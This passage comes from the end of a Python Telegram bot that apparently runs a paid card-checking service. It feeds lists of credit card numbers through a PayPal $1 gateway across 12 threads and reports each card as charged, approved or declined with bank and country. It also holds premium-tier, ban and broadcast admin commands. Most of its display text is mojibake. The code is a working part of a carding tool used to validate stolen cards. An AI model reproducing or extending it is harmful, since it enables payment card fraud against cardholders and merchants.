            elif is_premium(user_id): is_p = " [ð£ð¥ðð ðð¨ð ]"
            else: is_p = " [ðð¥ðð]"
            status_f = "ðð¡ðð«ð ðð ð¥" if status == "CHARGED" else "ðð©ð©ð«ð¨ð¯ðð â" if status == "APPROVED" else "ðððð¥ð¢ð§ðð"
            
            safe_fname = str(message.from_user.first_name).replace("<", "").replace(">", "").replace("&", "")
            safe_bank = str(bank).replace("<", "").replace(">", "").replace("&", "")
            safe_brand = str(brand).replace("<", "").replace(">", "").replace("&", "")
            
            res_single = f"""
ððð«ð â <code>{cc}</code>
ðð­ðð­ð®ð¬ â {status_f}
ððð¬ð©ð¨ð§ð¬ð â <code>{response}</code>
ððð­ðð°ðð² â ððð²ð©ðð¥ ð$
âââââââââââ
ðð§ðð¨ â {safe_brand} - {type_cc} - {level}
ððð§ð¤ â {safe_bank}
ðð¨ð®ð§ð­ð«ð² â {country}
âââââââââââ
ðð¡ððð¤ðð ðð² â {safe_fname}{is_p}
â¬ ððð¯ â¬ @Xoarch
"""
            try: bot.reply_to(message.reply_to_message, res_single, parse_mode="HTML")
            except Exception as e:
                print("[!] HTML Parse Error while hitting: ", e)
                try: bot.send_message(message.chat.id, res_single.replace("<code>", "").replace("</code>", ""))
                except: pass

        if results["checked"] % 10 == 0 or results["checked"] == total:
            p = (results["checked"] / total) * 100
            filled = int(p // 10)
            bar = "â " * filled + "â¡" * (10 - filled)
            tt = round(time.time() - start_time, 1)
            if is_admin(user_id): is_p = " [ððð ðð¡]"
            elif is_premium(user_id): is_p = " [ð£ð¥ðð ðð¨ð ]"
            else: is_p = " [ðð¥ðð]"
            update_text = f"ð£ð®ðð½ð®ð¹ððµð¸ ðð¼ð¯: {job_id} / ð£ð®ðð½ð®ð¹ â ð¥ðð»ð»ð¶ð»ð´\n\n[{bar}] ({round(p, 1)}%)\n\nð§ð®ðð¸       - ð£ð®ðð½ð®ð¹ ð­$\nð§ð¼ðð®ð¹      - {total}\nð£ð¿ð¼ð°ð²ððð²ð±  - {results['checked']}/{total}\nððµð®ð¿ð´ð²ð±    - {results['charged']}\nðð½ð½ð¿ð¼ðð²ð±   - {results['approved']}\nðð²ð°ð¹ð¶ð»ð²ð±   - {results['declined']}\nðð¿ð¿ð¼ð¿ð     - {results['error']}\nð§/ð§        - {tt}ð\nð¨ðð²ð¿       - {message.from_user.first_name}{is_p}\n\nð¦ð²ððð¶ð¼ð» ð¥ðð»ð»ð¶ð»ð´.\n\nðð²ð - @Xoarch"
            try: bot.edit_message_text(update_text, message.chat.id, prog_msg.message_id)
            except: pass

    with ThreadPoolExecutor(max_workers=12) as executor:
        for cc in ccs:
            if not ACTIVE_JOBS.get(job_id): break
            executor.submit(worker, cc)

    if not ACTIVE_JOBS.get(job_id):
        final_text = prog_msg.text.replace("ð¥ðð»ð»ð¶ð»ð´", "ð¦ðð¼ð½ð½ð²ð±").replace("ð¦ð²ððð¶ð¼ð» ð¥ðð»ð»ð¶ð»ð´.", "ð¦ð²ððð¶ð¼ð» ð¦ðð¼ð½ð½ð²ð±.")
        try: bot.edit_message_text(final_text, message.chat.id, prog_msg.message_id)
        except: pass
        del ACTIVE_JOBS[job_id]
        if USER_ACTIVE_JOB.get(user_id) == job_id:
            ACTIVE_USERS_MPP[user_id] = False
            USER_ACTIVE_JOB.pop(user_id, None)
        return

    tt = round(time.time() - start_time, 1)
    if is_admin(user_id): is_p = " [ððð ðð¡]"
    elif is_premium(user_id): is_p = " [ð£ð¥ðð ðð¨ð ]"
    else: is_p = " [ðð¥ðð]"
    
    final_text = f"ð£ð®ðð½ð®ð¹ððµð¸ ðð¼ð¯: {job_id} / ð£ð®ðð½ð®ð¹ â ðð¼ðºð½ð¹ð²ðð²ð±\n\n[â â â â â â â â â â ] (100.0%)\n\nð§ð®ðð¸       - ð£ð®ðð½ð®ð¹ ð­$\nð§ð¼ðð®ð¹      - {total}\nð£ð¿ð¼ð°ð²ððð²ð±  - {results['checked']}/{total}\nððµð®ð¿ð´ð²ð±    - {results['charged']}\nðð½ð½ð¿ð¼ðð²ð±   - {results['approved']}\nðð²ð°ð¹ð¶ð»ð²ð±   - {results['declined']}\nðð¿ð¿ð¼ð¿ð     - {results['error']}\nð§/ð§        - {tt}ð\nð¨ðð²ð¿       - {message.from_user.first_name}{is_p}\n\nð¦ð²ððð¶ð¼ð» ðð¶ð»ð¶ððµð²ð±.\n\nðð²ð - @Xoarch"
    try: bot.edit_message_text(final_text, message.chat.id, prog_msg.message_id)
    except: pass
    del ACTIVE_JOBS[job_id]
    if USER_ACTIVE_JOB.get(user_id) == job_id:
        ACTIVE_USERS_MPP[user_id] = False
        USER_ACTIVE_JOB.pop(user_id, None)

@bot.message_handler(commands=['stop'])
def stop_job(message):
    user_id = message.from_user.id
    if not is_premium(user_id) and not is_admin(user_id):
        bot.reply_to(message, "[â] ð£ð¿ð²ðºð¶ððº ð¢ð»ð¹ð! ð¨ð½ð´ð¿ð®ð±ð² ðð¼ ð£ð¿ð²ðºð¶ððº ðð¼ ððð² ð ð®ðð ððµð²ð°ð¸ ð®ð»ð± /ððð¼ð½.")
        return
    parts = message.text.split()

    if len(parts) > 1:
        jid = parts[1].upper()
    else:
        jid = USER_ACTIVE_JOB.get(user_id)
        if not jid:
            bot.reply_to(message, "[â] ð¬ð¼ð ð±ð¼ð»'ð ðµð®ðð² ð®ð»ð ð®ð°ðð¶ðð² ðð²ððð¶ð¼ð» ðð¼ ððð¼ð½.")
            return

    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False
        if USER_ACTIVE_JOB.get(user_id) == jid:
            USER_ACTIVE_JOB.pop(user_id, None)
            ACTIVE_USERS_MPP[user_id] = False
        bot.reply_to(message, f"[â] ð¦ð²ððð¶ð¼ð» {jid} ððð¼ð½ð½ð²ð±. ð¬ð¼ð ð°ð®ð» ð»ð¼ð ððð®ð¿ð ð® ð»ð²ð ð¼ð»ð².")
    else:
        bot.reply_to(message, f"[â] ð¦ð²ððð¶ð¼ð» {jid} ð»ð¼ð ð³ð¼ðð»ð± ð¼ð¿ ð®ð¹ð¿ð²ð®ð±ð ð³ð¶ð»ð¶ððµð²ð±!")

@bot.message_handler(commands=['addpremium'])
def add_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[â] ð¬ð¼ð ð±ð¼ð»ð ðµð®ðð² ð½ð²ð¿ðºð¶ððð¶ð¼ð» ðð¼ ððð² ððµð¶ð ð°ð¼ðºðºð®ð»ð±!!")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        
        if is_premium(target_id):
            bot.reply_to(message, f"[â] ð¨ðð²ð¿ {target_id} ð®ð¹ð¿ð²ð®ð±ð ðµð®ð ð®ð» ð®ð°ðð¶ðð² ð£ð¿ð²ðºð¶ððº ððð¯ðð°ð¿ð¶ð½ðð¶ð¼ð»!")
            return
            
        duration = parts[2]
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        
        with open(PREMIUM_FILE, 'a') as f: f.write(f"{target_id}|{exp}\n")
        
        if is_admin(message.from_user.id): is_p = " [ððð ðð¡]"
        elif is_premium(message.from_user.id): is_p = " [ð£ð¥ðð ðð¨ð ]"
        else: is_p = " [ðð¥ðð]"
        res = f"""
ðððð¨ð®ð§ð­ ðð§ðð¨ð«ð¦ðð­ð¢ð¨ð§
âââââââââââââ
â ð§ð®ð¿ð´ð²ð ðð â¬ {target_id}
â ðð°ðð¶ð¼ð» â¬ Premium Added
â ððð¿ð®ðð¶ð¼ð» â¬ {duration.upper()}
â ð¡ð²ð ð¥ð®ð»ð¸ â¬ [ð£ð¥ðð ðð¨ð ]
âââââââââââââ
â¬ ðð¬ðð« â¬ {message.from_user.first_name}{is_p}
â¬ ððð¯ â¬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), f"[!] ð¡ð¼ðð¶ð°ð²: ð¬ð¼ð ðµð®ðð² ð¯ð²ð²ð» ð´ð¿ð®ð»ðð²ð± ð£ð¿ð²ðºð¶ððº ð®ð°ð°ð²ðð ð³ð¼ð¿ {duration.upper()}! ðð»ð·ð¼ð ðð»ð¹ð¶ðºð¶ðð²ð± ð°ðµð²ð°ð¸ð.")
        except: pass
    except: bot.reply_to(message, "[â] ð¨ðð®ð´ð²: /addpremium <userid> <days>(1s,1m,1h,1d,lifetime)")

@bot.message_handler(commands=['rmpremium'])
def rm_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[â] ð¬ð¼ð ð±ð¼ð»ð ðµð®ðð² ð½ð²ð¿ðºð¶ððð¶ð¼ð» ðð¼ ððð² ððµð¶ð ð°ð¼ðºðºð®ð»ð±!!")
        return
    try:
        target_id = message.text.split()[1]
        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        
        if is_admin(message.from_user.id): is_p = " [ððð ðð¡]"
        elif is_premium(message.from_user.id): is_p = " [ð£ð¥ðð ðð¨ð ]"
        else: is_p = " [ðð¥ðð]"
        res = f"""
ðððð¨ð®ð§ð­ ðð§ðð¨ð«ð¦ðð­ð¢ð¨ð§
âââââââââââââ
â ð§ð®ð¿ð´ð²ð ðð â¬ {target_id}
â ðð°ðð¶ð¼ð» â¬ Premium Removed
â ð¥ð²ð®ðð¼ð» â¬ Admin Action
â ð¡ð²ð ð¥ð®ð»ð¸ â¬ [ðð¥ðð]
âââââââââââââ
â¬ ðð¬ðð« â¬ {message.from_user.first_name}{is_p}
â¬ ððð¯ â¬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), "[!] ð¡ð¼ðð¶ð°ð²: ð¬ð¼ðð¿ ð£ð¿ð²ðºð¶ððº ð®ð°ð°ð²ðð ðµð®ð ð¯ð²ð²ð» ð¿ð²ðºð¼ðð²ð± ð¯ð ð®ð» ð®ð±ðºð¶ð».")
        except: pass
    except: bot.reply_to(message, "[â] ð¨ðð®ð´ð²: /rmpremium <userid>")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[â] ð¬ð¼ð ð±ð¼ð»ð ðµð®ðð² ð½ð²ð¿ðºð¶ððð¶ð¼ð» ðð¼ ððð² ððµð¶ð ð°ð¼ðºðºð®ð»ð±!!")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        duration = parts[2] if len(parts) > 2 else 'lifetime'
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        
        with open(BANNED_FILE, 'a') as f: f.write(f"{target_id}|{exp}\n")
        dur_label = "Lifetime" if duration == 'lifetime' else duration.upper()
        bot.reply_to(message, f"[â] ð¨ðð²ð¿ {target_id} ðð®ð»ð»ð²ð± ({dur_label}) ð¯ð ðð±ðºð¶ð»!")
        try: bot.send_message(int(target_id), f"[!] ð¡ð¼ðð¶ð°ð²: ð¬ð¼ð ðµð®ðð² ð¯ð²ð²ð» ððð¡ð¡ðð ð¯ð ð®ð» ðð±ðºð¶ð».\n\nððð¿ð®ðð¶ð¼ð»: {dur_label}\nð¦ðð®ððð: Restricted access\n\nðð¼ð»ðð®ð°ð ðð±ðºð¶ð».")
        except: pass
    except: bot.reply_to(message, "[â] ð¨ðð®ð´ð²: /ban <userid> <duration>")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[â] ð¬ð¼ð ð±ð¼ð»ð ðµð®ðð² ð½ð²ð¿ðºð¶ððð¶ð¼ð» ðð¼ ððð² ððµð¶ð ð°ð¼ðºðºð®ð»ð±!!")
        return
    try:
        target_id = message.text.split()[1]
        with open(BANNED_FILE, 'r') as f: lines = f.readlines()
        with open(BANNED_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        bot.reply_to(message, f"[â] ð¨ðð²ð¿ {target_id} ðð»ð¯ð®ð»ð»ð²ð± ð¯ð ðð±ðºð¶ð»!")
        try: bot.send_message(int(target_id), f"[!] ð¡ð¼ðð¶ð°ð²: ð¬ð¼ðð¿ ððð¡ ðµð®ð ð¯ð²ð²ð» ð¥ðð ð¢ð©ðð ð¯ð ð®ð» ðð±ðºð¶ð».\n\nð¬ð¼ð ð°ð®ð» ð»ð¼ð ððð² ððµð² ð¯ð¼ð ð®ð´ð®ð¶ð». ð ð®ð¸ð² ððð¿ð² ðð¼ ð³ð¼ð¹ð¹ð¼ð ððµð² ð°ð¼ðºðºðð»ð¶ðð ð¿ðð¹ð²ð!")
        except: pass
    except: bot.reply_to(message, "[â] ð¨ðð®ð´ð²: /unban <userid>")

@bot.message_handler(commands=['info'])
def user_info(message):
    try:
        parts = message.text.split()
        target_id = parts[1] if len(parts) > 1 else message.from_user.id
        target_id = str(target_id)
        
        role = "[ðð¥ðð]"
        limit = FREE_LIMIT
        expire_str = "NEVER"
        
        if is_banned(int(target_id)):
            role = "[ððð¡ð¡ðð]"
            limit = 0
            expire_str = "Restricted"
        elif is_admin(int(target_id)):
            role = "[ððð ðð¡]"
            limit = PREMIUM_LIMIT
            expire_str = "Lifetime"
        else:
            with open(PREMIUM_FILE, 'r') as f:
                premiums = f.read().splitlines()
                for p in premiums:
                    if target_id in p:
                        role = "[ð£ð¥ðð ðð¨ð ]"
                        limit = PREMIUM_LIMIT
                        prts = p.split('|')
                        if len(prts) > 1:
                            exp = float(prts[1])
                            if exp == 0: expire_str = "Lifetime"
                            else:
                                if time.time() > exp:
                                    role = "[ðð¥ðð]"
                                    limit = FREE_LIMIT
                                    expire_str = "Expired"
                                else:
                                    expire_str = datetime.datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S')
                        else: expire_str = "Lifetime"
                        break

        if is_admin(message.from_user.id): is_p = " [ððð ðð¡]"
        elif is_premium(message.from_user.id): is_p = " [ð£ð¥ðð ðð¨ð ]"
        else: is_p = " [ðð¥ðð]"
        
        res = f"""
ðððð¨ð®ð§ð­ ðð§ðð¨ð«ð¦ðð­ð¢ð¨ð§
âââââââââââââ
â ð¨ðð²ð¿ ðð â¬ {target_id}
â ð¥ð®ð»ð¸ â¬ {role}
â ððð½ð¶ð¿ð²ð â¬ {expire_str}
â ð ð®ðð ðð¶ðºð¶ð â¬ {limit}
âââââââââââââ
â¬ ðð¬ðð« â¬ {message.from_user.first_name}{is_p}
â¬ ððð¯ â¬ @Xoarch
"""
        bot.reply_to(message, res)
    except:
        bot.reply_to(message, "[â] ðð¿ð¿ð¼ð¿ ð³ð²ðð°ðµð¶ð»ð´ ð¶ð»ð³ð¼!")

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[â] ð¬ð¼ð ð±ð¼ð»ð ðµð®ðð² ð½ð²ð¿ðºð¶ððð¶ð¼ð» ðð¼ ððð² ððµð¶ð ð°ð¼ðºðºð®ð»ð±!!")
        return
    s = get_stats()
    
    with open(BANNED_FILE, 'r') as f: banned_count = len(f.read().splitlines())
    with open(PREMIUM_FILE, 'r') as f: premium_count = len(f.read().splitlines())
    
    s["premium_users"] = premium_count
    s["banned_users"] = banned_count
    save_stats(s)
    
    res = f"""
ðð¼ð ð¦ðð®ðð:
âââââââââââââ
â ððµð®ð¿ð´ð²ð±: {s['charged']}
â ðð½ð½ð¿ð¼ðð²ð±: {s['approved']}
â ð£ð¿ð²ðºð¶ððº ð¨ðð²ð¿ð: {premium_count}
â ðð®ð»ð»ð²ð± ð¨ðð²ð¿ð: {banned_count}
â ð§ð¼ðð®ð¹ ð¨ðð²ð¿ð: {s['total_users']}
âââââââââââââ
â¬ ððð¯ â¬ @Xoarch
"""
    bot.reply_to(message, res)

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[â] ð¬ð¼ð ð±ð¼ð»ð ðµð®ðð² ð½ð²ð¿ðºð¶ððð¶ð¼ð» ðð¼ ððð² ððµð¶ð ð°ð¼ðºðºð®ð»ð±!!")
        return
    
    msg_text = message.text.replace('/broadcast ', '')
    if msg_text == '/broadcast':
        bot.reply_to(message, "[â] ð¨ðð®ð´ð²: /broadcast <message>")
        return
    
    with open(USERS_FILE, 'r') as f:
        users = f.read().splitlines()
    
    sent_msg = bot.reply_to(message, f"[â] ð¦ðð®ð¿ðð¶ð»ð´ ðð¿ð¼ð®ð±ð°ð®ðð ðð¼ {len(users)} ððð²ð¿ð...")
    
    count = 0
    for user in users:
        try:
            bot.send_message(int(user), msg_text)
            count += 1
        except:
            pass
    
    try:
        bot.edit_message_text(f"[â] ðð¿ð¼ð®ð±ð°ð®ðð ðð¼ðºð½ð¹ð²ðð²ð±!\n\nð¦ð²ð»ð ðð¼: {count}/{len(users)} ððð²ð¿ð.", message.chat.id, sent_msg.message_id)
    except:
        bot.reply_to(message, f"[â] ðð¿ð¼ð®ð±ð°ð®ðð ðð¼ðºð½ð¹ð²ðð²ð±!\n\nð¦ð²ð»ð ðð¼: {count}/{len(users)} ððð²ð¿ð.")



if __name__ == "__main__":
    print("ðð¢ð§ ðð¦ ð¥ð¨ð¡ð¡ðð¡ð...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling Error: {e}")
            time.sleep(5)
